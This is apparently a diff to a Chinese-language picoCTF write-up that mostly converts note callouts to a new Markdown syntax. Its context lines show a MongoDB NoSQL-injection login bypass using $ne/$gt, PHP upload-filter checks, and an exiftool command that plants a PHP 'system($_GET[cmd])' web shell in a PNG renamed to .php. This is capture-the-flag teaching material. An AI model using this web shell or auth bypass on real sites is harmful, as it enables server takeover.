@@ -218,7 +218,7 @@ http://titan.picoctf.net:53048/
 
 ## IntroToBurp
 ![image](https://hackmd.io/_uploads/r1qUbgyAT.png)
-http://titan.picoctf.net:57361/
+http://titan.picoctf.net:57361/ \
 ![image](https://hackmd.io/_uploads/BypFbl1Rp.png)
 
 ### IntroToBurp Solution
@@ -326,12 +326,12 @@ const User = models.User || mongoose.model<UserInterface>("User", UserSchema);
 > [NoSQL injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
 
 #### 1. 繞過驗證
-:::info
-Authentication bypass
-在 MongoDB 中
-$ne: 代表 "not equal"，用於篩選出某個欄位的值不等於指定值的文件（或記錄）。
-$gt: 代表 "greater than"，用於篩選出某個欄位的值大於指定值的文件（或記錄）。
-:::
+> [!NOTE]
+>Authentication bypass
+>在 MongoDB 中
+>$ne: 代表 "not equal"，用於篩選出某個欄位的值不等於指定值的文件（或記錄）。
+>$gt: 代表 "greater than"，用於篩選出某個欄位的值大於指定值的文件（或記錄）。
+
 ```
 POST /api/login/ HTTP/1.1
 Host: atlas.picoctf.net:61553
@@ -391,7 +391,7 @@ Content-Length: 237
 
 ## Trickster
 ![image](https://hackmd.io/_uploads/SkUqBQyA6.png)
-http://atlas.picoctf.net:63080/
+http://atlas.picoctf.net:63080/ \
 ![image](https://hackmd.io/_uploads/B1airX1Ra.png)
 ### Trickster Solution
 上傳成功只會顯示:
@@ -477,31 +477,31 @@ dirsearch -u http://atlas.picoctf.net:64632/
 > 看到 /uploads 路徑 301
 
 #### 4. png 塞入php後門
-:::info
-常見的上傳檔案格式判斷
+> [!NOTE]
+>常見的上傳檔案格式判斷
+>
+>(1) HTML顯示 only png，內部沒有過濾
+>```php
+>$filename = basename($_FILES['image_file']['name']);
+>```
+>
+>(2) 判斷filename
+>```php
+>$filename = basename($_FILES['image_file']['name']);
+>$extension = strtolower(explode(".", $filename)[1]);
+>if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false)
+>```
+>
+>(3)判斷filename & file information
+>```php
+>$filename = basename($_FILES['image_file']['name']);
+>$extension = strtolower(explode(".", $filename)[1]);
+>if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false)
+>使用者上傳檔案時，getimagesize取得圖像檔案的資訊
+>list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']);
+>if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false)
+>```
 
-(1) HTML顯示 only png，內部沒有過濾
-```php
-$filename = basename($_FILES['image_file']['name']);
-```
-
-(2) 判斷filename
-```php
-$filename = basename($_FILES['image_file']['name']);
-$extension = strtolower(explode(".", $filename)[1]);
-if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false)
-```
-
-(3)判斷filename & file information
-```php
-$filename = basename($_FILES['image_file']['name']);
-$extension = strtolower(explode(".", $filename)[1]);
-if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false)
-使用者上傳檔案時，getimagesize取得圖像檔案的資訊
-list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']);
-if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false)
-```
-:::
 ```
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' CTF.png
 mv CTF.png CTF.png.php
